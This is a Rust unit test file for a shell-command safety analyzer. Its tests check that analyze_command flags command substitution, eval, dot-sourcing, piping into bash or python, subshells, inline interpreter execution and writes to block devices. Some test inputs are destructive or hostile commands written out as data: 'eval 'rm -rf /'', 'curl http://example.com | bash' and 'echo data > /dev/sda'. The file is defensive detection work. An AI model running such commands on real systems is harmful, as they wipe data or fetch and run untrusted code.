use super::*;

#[test]
fn test_simple_command() {
    let result = analyze_command("ls -la");
    assert!(
        result.is_empty(),
        "simple command should have no violations"
    );
}

#[test]
fn test_command_substitution_dollar_paren() {
    let result = analyze_command("echo $(whoami)");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::CommandSubstitution),
        "should detect $() command substitution"
    );
}

#[test]
fn test_command_substitution_backtick() {
    let result = analyze_command("echo `whoami`");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::CommandSubstitution),
        "should detect backtick command substitution"
    );
}

#[test]
fn test_eval_builtin() {
    // Tests that the shell AST analyzer detects the 'eval' builtin
    // which can execute arbitrary strings as shell commands
    let result = analyze_command("eval 'rm -rf /'");
    assert!(
        result.iter().any(|v| v.kind == ViolationKind::EvalLike),
        "should detect the eval builtin"
    );
}

#[test]
fn test_source_dot() {
    let result = analyze_command(". /etc/profile");
    assert!(
        result.iter().any(|v| v.kind == ViolationKind::EvalLike),
        "should detect dot-source as eval-like"
    );
}

#[test]
fn test_dangerous_pipe_target() {
    let result = analyze_command("curl http://example.com | bash");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousPipeTarget),
        "should detect piping into bash"
    );
}

#[test]
fn test_pipe_to_safe_target_no_dangerous_flag() {
    let result = analyze_command("cat file.txt | grep pattern");
    assert!(
        !result
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousPipeTarget),
        "piping to grep should not flag DangerousPipeTarget"
    );
}

#[test]
fn test_subshell() {
    let result = analyze_command("(cd /tmp && ls)");
    assert!(
        result.iter().any(|v| v.kind == ViolationKind::Subshell),
        "should detect subshell"
    );
}

#[test]
fn test_process_substitution() {
    let result = analyze_command("diff <(ls dir1) <(ls dir2)");
    // Process substitution may or may not be detected depending on parser
    // Just verify it doesn't panic
    let _ = result;
}

#[test]
fn test_function_definition() {
    let result = analyze_command("foo() { echo bar; }");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::FunctionDefinition),
        "should detect function definition"
    );
}

#[test]
fn test_empty_command() {
    let result = analyze_command("");
    assert!(result.is_empty(), "empty command should have no violations");
}

#[test]
fn test_interpreter_inline_exec_python() {
    let result = analyze_command("python3 -c 'import os'");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::InterpreterInlineExec),
        "should detect python3 -c inline exec"
    );
}

#[test]
fn test_interpreter_inline_exec_node() {
    let result = analyze_command("node -e 'process.exit(1)'");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::InterpreterInlineExec),
        "should detect node -e inline exec"
    );
}

#[test]
fn test_dangerous_redirection_to_device() {
    let result = analyze_command("echo data > /dev/sda");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousRedirection),
        "should detect write to block device"
    );
}

#[test]
fn test_safe_redirection_to_file() {
    let result = analyze_command("echo data > /tmp/output.txt");
    assert!(
        !result
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousRedirection),
        "writing to regular file should not flag DangerousRedirection"
    );
}

#[test]
fn test_multiple_violations() {
    // 'eval $(whoami)' should trigger both EvalLike and CommandSubstitution
    let result = analyze_command("eval $(whoami)");
    assert!(
        result.iter().any(|v| v.kind == ViolationKind::EvalLike),
        "should detect eval-like builtin"
    );
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::CommandSubstitution),
        "should detect command substitution"
    );
}

#[test]
fn test_simple_safe_commands_no_violations() {
    for cmd in &[
        "echo hello",
        "cat file.txt",
        "git status",
        "ls -la /tmp",
        "date",
    ] {
        let result = analyze_command(cmd);
        assert!(
            result.is_empty(),
            "'{cmd}' should have no violations, got: {result:?}"
        );
    }
}

#[test]
fn test_pipe_into_python_is_dangerous() {
    let result = analyze_command("echo 'import os' | python3");
    assert!(
        result
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousPipeTarget),
        "piping into python3 should be flagged"
    );
}

#[test]
fn test_interpreter_without_inline_flag_ok() {
    // python3 without -c or -e should not flag InterpreterInlineExec
    let result = analyze_command("python3 script.py");
    assert!(
        !result
            .iter()
            .any(|v| v.kind == ViolationKind::InterpreterInlineExec),
        "python3 with a script file should not flag InterpreterInlineExec"
    );
}
